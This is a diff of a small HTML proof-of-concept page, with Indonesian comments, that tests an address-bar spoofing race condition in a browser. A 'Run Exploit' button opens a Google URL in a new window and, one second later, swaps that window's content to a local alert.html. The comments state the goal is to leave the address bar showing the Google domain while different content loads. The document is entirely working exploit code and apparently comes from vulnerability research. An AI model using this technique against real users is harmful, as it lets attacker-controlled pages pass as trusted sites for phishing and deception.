@@ -1,22 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Internal Lab Research</title>
-</head>
 <body>
-    <div style="text-align: center; padding-top: 50px; font-family: sans-serif;">
-        <h2>Security Research Lab</h2>
-        <p>Testing Navigation Race Condition</p>
-        <button onclick="myFunction()" style="padding: 10px 20px; cursor: pointer;">Run Exploit</button>
-    </div>
+    <button onclick="myFunction()">Run Exploit</button>
 
     <script>
     function myFunction() {
-        // 1. Buka domain terpercaya (Google) di jendela baru
-        var x = window.open("https://www.google.com/csi", "research_win", "width=500,height=600");
+        // Buka Google CSI (atau domain Google lainnya)
+        var x = window.open("https://www.google.com/csi", "poc_win", "width=500,height=600");
 
-        // 2. Race Condition: Ganti lokasi ke alert.html setelah 1 detik
-        // Tujuannya biar Address Bar nyangkut di domain Google pas konten ganti
+        // Tunggu 1 detik biar Address Bar stabil di Google, baru tembak alert.html
         setTimeout(function(){
             x.location = "alert.html";
         }, 1000);
